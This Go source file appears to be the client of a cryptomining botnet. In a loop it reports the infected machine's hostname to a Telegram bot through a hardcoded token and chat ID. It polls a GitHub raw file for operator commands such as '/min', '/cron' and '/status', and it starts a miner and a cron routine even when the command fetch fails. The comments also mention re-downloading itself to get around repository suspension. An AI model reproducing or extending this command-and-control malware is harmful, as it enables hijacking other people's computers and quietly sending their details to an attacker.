package main


import(


"time"
"strings"
"net/http"
"net/url"
"io/ioutil"
"io"
"fmt"
)



func bot(msg_to_bot string) {
 
 
 
         token := "9180321584:AAFZZSRVKx3W8VL71bs624PiltBfz7vGQHU"
         chatID := "7127446120"
 
          resp, err := http.PostForm("https://api.telegram.org/bot"+token+"/sendMessage", url.Values{
                  "chat_id": {chatID},
                  "text":    {msg_to_bot},
          })
 
          if err != nil {
                  return
          }
          defer resp.Body.Close()
 
          body, _ := io.ReadAll(resp.Body)
          fmt.Println(string(body))
   
 
 }
 
 






func get_msg(){



cli  :=   http.Client{}
 
req  , err_get :=  cli.Get("https://github.com/atilaadmin/atila/raw/refs/heads/master/msg/msg.txt")


if   err_get != nil {

//erro em get msg

go miner()

go cron()
  

}





if err_get == nil {

msg_by  , err_rd  :=  ioutil.ReadAll(req.Body)

if err_rd != nil { return }

msg_string :=  string(msg_by)


//////////////////////////////////////////////


//fmt.Println(msg_string)

if strings.Contains(msg_string, "/min") {

miner()

}



if strings.Contains(msg_string, "/cron") {

cron()


}




if strings.Contains(msg_string, "/status") {

fmt.Println("pegando o status do vkzmn")

status  := proc()

if (status == "ok") {  bot( "vkzmn_ok" ) ; return  } 
 
bot("vkzmn not ok")


} }  }





func main(){


for {


//

update()  //update is the  function to redown new atila because github  suspender repor 

//


machine_name  := uname_n() 
bot("machine "   + machine_name + " listen ....")
//send name of the machine by bot

fmt.Println("get msg ..")

get_msg() //get msg  by operator 

fmt.Println("time 100 sec to get msg ..")


time.Sleep(100    * time.Second)



}

}




















